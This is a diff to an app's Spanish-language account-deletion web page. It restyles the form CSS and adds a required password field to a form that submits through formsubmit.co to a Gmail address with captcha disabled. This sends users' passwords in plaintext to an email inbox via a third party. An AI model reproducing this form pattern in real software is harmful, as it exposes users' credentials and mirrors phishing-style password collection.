@@ -58,25 +58,26 @@ ul.steps li { margin-bottom: 12px; }
 form {
   display: flex;
   flex-direction: column;
-  align-items: center; /* centra horizontalmente los elementos */
+  align-items: center;
 }
 
-input[type="email"], button {
-  width: 100%; /* ocupa todo el ancho disponible */
-  max-width: 400px; /* limita ancho máximo */
-  margin: 10px 0; /* espacio entre elementos */
+/* INPUTS Y BOTÓN */
+input[type="email"], input[type="password"], button {
+  width: 100%;
+  max-width: 400px;
+  margin: 10px 0;
   padding: 15px 20px;
   font-size: 1rem;
   border-radius: 10px;
-  text-align: center; /* centra el texto dentro del input */
+  text-align: center;
   transition: all 0.3s ease;
 }
 
-input[type="email"] {
+input[type="email"], input[type="password"] {
   border: 2px solid #001f4d;
 }
 
-input[type="email"]:focus {
+input[type="email"]:focus, input[type="password"]:focus {
   outline: none;
   border-color: #0044cc;
   box-shadow: 0 0 10px rgba(0,68,204,0.5);
@@ -145,12 +146,15 @@ button:active {
 
   <p>Si prefieres, solicita que borremos tus datos aquí:</p>
 
-  <!-- FORMULARIO CON FORMSUBMIT -->
+  <!-- FORMULARIO CON CORREO Y CONTRASEÑA -->
   <form id="eliminarForm" action="https://formsubmit.co/asistenciatecnicostec@gmail.com" method="POST">
     <input type="email" name="email" placeholder="Tu correo electrónico" required autocomplete="email" />
+    <input type="password" name="password" placeholder="Tu contraseña" required autocomplete="current-password" />
+
     <input type="hidden" name="Mensaje" value="Deseo eliminar mi cuenta de la aplicación Técnico en Calidad" />
     <input type="hidden" name="_subject" value="Solicitud de eliminación de cuenta - Técnico en Calidad" />
     <input type="hidden" name="_captcha" value="false" />
+
     <button type="submit">Solicitar</button>
   </form>
 
